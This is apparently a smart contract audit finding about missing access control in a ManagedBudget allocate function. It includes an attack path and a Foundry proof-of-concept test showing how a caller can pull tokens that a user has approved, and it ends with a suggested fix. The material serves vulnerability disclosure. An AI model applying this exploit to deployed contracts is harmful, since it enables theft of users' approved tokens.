# Attacker can drain tokens from users who have approved the ManagedBudget contract

### Summary

Lack of access control in the `allocate` function will cause unauthorized token transfers for users who have approved the `ManagedBudget` contract as an attacker will call the `allocate` function with arbitrary target addresses.


### Root Cause

In [`ManagedBudget.sol `, the `allocate` function](https://github.com/sherlock-audit/2024-06-boost-aa-wallet/blob/main/boost-protocol/packages/evm/contracts/budgets/ManagedBudget.sol#L57-L90) lacks access control and allows arbitrary target addresses.

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

1. User (e.g., Alice) approves the `ManagedBudget` contract to spend their tokens:
    ```solidity
    erc20Token.approve(address(managedBudget), 1000);
    ```
2. Attacker crafts a malicious `Transfer` struct with Alice's address as the target:
    ```solidity
    Transfer memory maliciousTransfer = Transfer({
        assetType: AssetType.ERC20,
        asset: address(erc20Token),
        target: alice.address,
        data: abi.encode(FungiblePayload({ amount: 1000 }))
    });
    ```
3. Attacker calls the `allocate` function with the crafted `Transfer` struct:
    ```solidity
    managedBudget.allocate(abi.encode(maliciousTransfer));
    ```
4. The `allocate` function executes the transfer, moving tokens from Alice to the `ManagedBudget` contract without her consent.


### Impact

The affected users suffer a loss of their approved tokens up to the full amount of their allowance. The attacker gains control over these tokens within the `ManagedBudget` contract and transfer all the approved tokens.


### PoC

- Add the test function to the `ManagedBudget.t.sol`
- Use the following command to run the test and verify the bug:
```bash
forge test --match-path ./test/budgets/ManagedBudget.t.sol --mt testAllocate_UnauthorizedTransfer -vvv
```
#### test poc
```solidity
    function testAllocate_UnauthorizedTransfer() public {
        // Step 1: Setup - Alice approves the ManagedBudget contract to spend her tokens
        address alice = address(0x1);
        address attacker = address(0x2);
        mockERC20.mint(alice, 100 ether);
        vm.prank(alice);
        mockERC20.approve(address(managedBudget), 100 ether);

        // Step 2: Craft Malicious Transfer - Attacker crafts a Transfer struct with Alice's address as the target
        bytes memory data = abi.encode(
            ABudget.Transfer({
                assetType: ABudget.AssetType.ERC20,
                asset: address(mockERC20),
                target: alice,
                data: abi.encode(ABudget.FungiblePayload({ amount: 100 ether }))
            })
        );

        // Step 3: Call Allocate - Attacker calls the allocate function
        console.log("Alice's balance before attack:", mockERC20.balanceOf(alice));
        console.log("ManagedBudget's balance before attack:", mockERC20.balanceOf(address(managedBudget)));
        vm.prank(attacker);
        managedBudget.allocate(data);
        console.log("Alice's balance after attack:", mockERC20.balanceOf(alice));
        console.log("ManagedBudget's balance after attack:", mockERC20.balanceOf(address(managedBudget)));

        // Step 4: Verify - Ensure the tokens were transferred from Alice to the ManagedBudget contract
        assertEq(mockERC20.balanceOf(alice), 0);
        assertEq(mockERC20.balanceOf(address(managedBudget)), 100 ether);
    }
```

### Mitigation

Add access control to the `allocate` function and ensure the target is the caller
